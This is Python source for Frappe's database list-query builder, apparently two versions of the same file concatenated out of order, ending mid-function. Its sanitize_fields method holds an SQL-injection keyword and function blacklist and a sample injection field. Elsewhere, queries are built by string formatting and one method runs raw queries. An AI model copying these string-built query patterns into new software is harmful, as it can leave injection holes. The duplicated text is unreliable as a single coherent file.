			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',                    
			'from', 'group', 'order', 'by']                    
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)

		def _is_query(field):
			if re.compile("^(select|delete|update|drop|create)\s").match(field):
				_raise_exception()

			elif re.compile("\s*[a-zA-z]*\s*( from | group by | order by | where | join )").match(field):
				_raise_exception()

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):
				_raise_exception()

			_is_query(field)


	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	kwargs.pop('ignore_permissions', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.client import check_parent_permission
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)

		def _is_query(field):
			if re.compile("^(select|delete|update|drop|create)\s").match(field):
				_raise_exception()

			elif re.compile("\s*[a-zA-z]*\s*( from | group by | order by | where | join )").match(field):                    
				_raise_exception()

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):                    
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):                    
				_raise_exception()

			_is_query(field)


	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
